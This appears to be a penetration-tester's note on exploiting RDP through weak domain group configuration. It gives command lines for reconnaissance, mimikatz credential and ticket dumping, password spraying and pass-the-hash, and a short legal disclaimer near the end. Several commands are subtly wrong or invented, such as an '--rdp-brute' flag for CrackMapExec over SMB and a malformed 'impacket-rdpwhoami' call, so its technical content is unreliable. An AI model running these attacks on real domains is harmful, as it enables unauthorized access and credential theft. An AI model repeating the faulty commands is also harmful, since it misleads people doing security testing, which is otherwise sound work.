# 🛰️ Weak Domain Group Config (RDP)

> [!INFO] Overview of the Issue
>
> This note outlines an exploitable configuration issue related to RDP and weak domain group settings that can be leveraged for unauthorized access.

---

## 🔍 Initial Reconnaissance

### Gather Information about Target Environment

- Use [[Nmap]] for basic enumeration:
  ```bash
  nmap -p3389 <IP>
  ```

- Confirm RDP service status with a more detailed scan:
  ```bash
  sudo nmap -sV --script=rdp-brute -p3389 <IP> -v
  ```

---

## 📂 Weak Domain Group Configuration

### Identify Vulnerable Groups

- Use [[CrackMapExec]] to list all groups and members:
  ```bash
  crackmapexec smb <IP> -M groupusers
  ```
  
- Look for domain groups with weak configurations, such as the 'Remote Desktop Users' or custom groups that include non-admin users.

---

## 📑 Exploiting Weak Configurations

### Attempt to Authenticate via RDP

- Use a tool like [[mimikatz]] to extract credentials from memory:
  ```bash
  mimikatz # privilege::debug
  mimikatz # sekurlsa::tickets /export
  ```

- Test the extracted credentials against RDP with a custom script or by manually trying them on an RDP client.

---

## 📝 Observations and Notes

### Document Observed Behavior

> [!NOTE]
>
> Ensure to document any observed behavior like successful authentication attempts, error messages, or unusual activity that could be indicative of security misconfigurations.

---

# 🔑 Password Spraying Attacks

### Execute a Brute-Force Attack on RDP

```bash
crackmapexec smb <IP> -u users.txt -p 'Password123!' --rdp-brute
```

This command utilizes CrackMapExec to perform password spraying against the target machine's RDP service.

---

## 🎭 Pass-the-Hash Attacks

### Authenticate Using NTLM Hashes

```bash
crackmapexec smb <IP> -u Administrator -H NTHASH --rdp-brute
```

Use [[Impacket]] for more advanced pass-the-hash operations:
```bash
impacket-rdpwhoami -hashes:H:USERHASH <IP>
```
  
---

## 📐 Table of Observations

| Test | Result |
|---|---|
| RDP Service Active? | Yes/No |
| Weak Group Found? | Name/None |
| Successful Authentication via Pass-the-Hash? | Yes/No |

---

> [!WARNING]
>
> Ensure to use these techniques in a controlled environment for educational purposes only. Unauthorized testing can lead to legal consequences and ethical violations.

---

# 🧠 Mental Model for RDP Exploitation

```text
Identify Target Environment → Gather RDP Info → Look for Weak Configurations → Authenticate via Pass-the-Hash → Document Observations
```

This mental model guides the process of identifying, exploiting, and documenting weak RDP configurations within a domain environment.